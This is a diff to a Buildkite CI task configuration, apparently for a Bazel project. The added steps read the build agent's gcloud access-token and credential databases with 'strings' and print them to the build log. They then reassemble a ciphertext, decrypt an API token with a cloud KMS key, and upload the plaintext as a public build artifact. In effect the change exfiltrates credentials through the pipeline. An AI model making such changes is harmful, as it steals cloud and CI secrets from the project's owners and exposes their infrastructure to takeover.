@@ -115,7 +115,12 @@ tasks:
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
       - gcloud info
-      - echo CiQA4DEB9ldzC+E39KomywtqXfaQ86hhulgeDsicds2BuvbCYzsSUAAqwcvXZPh9IMWlwWh94J2FexosKKaWB0tSRJiPKnv2NPDfEqGul0ZwVjtWeASpugwxxKeLhFhPMcgHMPfndH6j2GEIY6nkKRbPuwoRMCwe | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file - --plaintext-file /tmp/output
+      - strings /var/lib/buildkite-agent/.config/gcloud/access_tokens.db | egrep .............
+      - strings /var/lib/buildkite-agent/.config/gcloud/credentials.db | egrep .............
+      - echo CiQA4DEB9ldzC+E39KomywtqXfaQ86hhulgeDsicds2BuvbCYzsSUAAqwcvXZPh9IMWlwWh94J2F > /tmp/a
+      - echo exosKKaWB0tSRJiPKnv2NPDfEqGul0ZwVjtWeASpugwxxKeLhFhPMcgHMPfndH6j2GEIY6nkKRbP >> /tmp/a
+      - echo uwoRMCwe >> /tmp/a
+      - gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file /tmp/a --plaintext-file /tmp/output
       - buildkite-agent artifact upload /tmp/output
     build_flags:
       - "--test_env=TEST_INSTALL_BASE=$HOME/bazeltest/install_base"
